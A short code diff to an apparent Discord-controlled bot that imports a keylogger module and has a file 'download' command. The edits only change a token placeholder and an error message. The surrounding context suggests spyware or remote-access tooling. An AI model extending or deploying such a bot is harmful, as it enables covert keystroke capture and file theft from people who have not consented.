@@ -8,7 +8,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKENHERE'
+TOKEN = 'token here'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -167,7 +167,8 @@ async def download(ctx: commands.Context, file:str, time:str="24h"):
         else:
             await ctx.send(f"**failed to turn file into link**```\nstatuscode:\n{statuscode}\n```")
     except Exception as e:
-        await ctx.send(f"{e}")
+        error = str(e) if str(e).strip() else "unknown error when downloading file"
+        await ctx.send(f"{error}")
 
 async def size(ctx: commands.Context, file=None):
     try:
